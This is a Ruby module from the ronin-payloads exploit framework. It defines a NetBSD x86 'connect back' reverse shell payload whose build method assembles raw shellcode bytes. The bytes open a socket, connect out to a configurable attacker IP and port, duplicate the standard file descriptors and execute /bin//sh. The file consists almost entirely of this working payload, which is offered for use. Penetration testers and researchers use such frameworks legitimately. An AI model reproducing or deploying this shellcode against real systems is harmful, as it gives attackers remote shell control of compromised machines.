# encoding: US-ASCII
# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2023 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/shellcode/reverse_shell_payload'

module Ronin
  module Payloads
    module Shellcode
      module NetBSD
        module X86
          #
          # NetBSD x86 shellcode that spawns a connect back reverse shell.
          #
          class ReverseShell < ReverseShellPayload

            register 'shellcode/netbsd/x86/reverse_shell'

            arch :x86
            os :netbsd

            author 'minervini', email: 'minervini@neuralnoise.com'

            summary 'NetBSD x86 reverse shell shellcode'
            description <<~DESC
            NetBSD x86 shellcode that spawns a connect back reverse shell.
            DESC

            references [
              "https://shell-storm.org/shellcode/files/shellcode-110.html"
            ]

            #
            # Builds the shellcode.
            #
            def build
              @payload = "\x31\xc0" \
                         "\x31\xc9" \
                         "\x50" \
                         "\x40" \
                         "\x50" \
                         "\x40" \
                         "\x50" \
                         "\x50" \
                         "\xb0\x61" \
                         "\xcd\x80" \
                         "\x89\xc3" \
                         "\x89\xe2" \
                         "\x49" \
                         "\x51" \
                         "\x51" \
                         "\x41" \
                         "\x68#{packed_ipv4(negate: true)}" \
                         "\x68\xff\xfd#{packed_port(negate: true)}" \
                         "\xb1\x10" \
                         "\x51" \
                         "\xf6\x12" \
                         "\x4a" \
                         "\xe2\xfb" \
                         "\xf6\x12" \
                         "\x52" \
                         "\x50" \
                         "\x50" \
                         "\xb0\x62" \
                         "\xcd\x80" \
                         "\xb1\x03" \
                         "\x49" \
                         "\x51" \
                         "\x41" \
                         "\x53" \
                         "\x50" \
                         "\xb0\x5a" \
                         "\xcd\x80" \
                         "\xe2\xf5" \
                         "\x51" \
                         "\x68\x2f\x2f\x73\x68" \
                         "\x68\x2f\x62\x69\x6e" \
                         "\x89\xe3" \
                         "\x51" \
                         "\x54" \
                         "\x53" \
                         "\x50" \
                         "\xb0\x3b" \
                         "\xcd\x80"
            end

          end
        end
      end
    end
  end
end
